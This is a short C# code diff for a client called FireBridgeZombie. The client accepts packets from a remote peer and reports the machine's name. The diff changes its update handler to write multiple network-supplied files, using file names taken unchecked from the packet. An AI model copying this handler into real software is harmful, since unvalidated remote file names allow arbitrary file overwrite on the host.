@@ -75,7 +75,10 @@ namespace FireBridgeZombie
                     }
                     break;
                 case 4: //Update
-                    File.WriteAllBytes("FireBridgeZombie.exe.new", (byte[])packet.Data);
+                    var data = (UpdateModel)packet.Data;
+                    for (int i = 0; i < data.Names.Count; i++)
+                        File.WriteAllBytes(data.Names[i] + ".new", data.Data[i]);
+
                     s.Stop();
                     DiscoveryServer.Stop();
                     Environment.ExitCode = 69;
@@ -84,14 +87,6 @@ namespace FireBridgeZombie
                     break;
                 case 5: //Identification
                     connection.SendPacket(new Packet() { Id = 5, Data = Environment.MachineName });
-                    break;
-                case 6: //Update
-                    File.WriteAllBytes("FirebridgeShared.dll.new", (byte[])packet.Data);
-                    s.Stop();
-                    DiscoveryServer.Stop();
-                    Environment.ExitCode = 69;
-                    Application.Exit();
-                    s.Stop();
                     break;
                 default:
                     Console.WriteLine("Unknown Packet of " + packet.Id);
